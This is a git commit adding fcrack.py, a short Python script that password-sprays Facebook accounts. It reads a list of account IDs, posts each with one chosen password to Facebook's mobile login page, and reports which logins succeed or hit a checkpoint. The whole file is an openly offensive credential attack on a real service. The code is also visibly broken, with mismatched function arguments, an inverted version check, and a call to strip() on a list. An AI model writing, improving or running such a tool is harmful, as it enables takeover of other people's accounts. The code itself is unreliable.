55e9e86e4d1255c809c1a9b7692d953d7ed5a796
mr4fun <45102116+MRforfun@users.noreply.github.com>
2019-07-02 08:40:44 +0700

    Create fcrack.py

---
+++ fcrack.py
@@ -0,0 +1,29 @@
+import requests, sys
+
+def brute():
+		link = ("https://m.facebook.com/login.php")
+		data = {"email":id, "pass":pw}
+		r = requests.post(link, data=data)
+		if "m_sess" in r.url or "save-device" in r.url:
+			print("[~] found id : "+ id +" pass : "+ pw)
+		elif "checkpoint" in r.url:
+			print("[~] checkpoint id : "+ id)
+		else:
+			print("[!] failed id : "+id)
+
+def list(file, pw):
+	o = open(file, "r").readlines()
+	for i in o:
+		brute(i.strip(),pw)
+
+if __name__ == '__main__':
+	if sys.version[0] <= "3":
+		print("[!] please use python 3+ ")
+		exit()
+
+	id = input("[*] input id list : ")
+	pw = input("[*] pass to crack : ")
+	o = open(id, "r").readlines()
+	print("[~] loaded %s id"%(len(o.strip())))
+	print("[~] with password to crack : "+ pw)
+	list(id,pw)
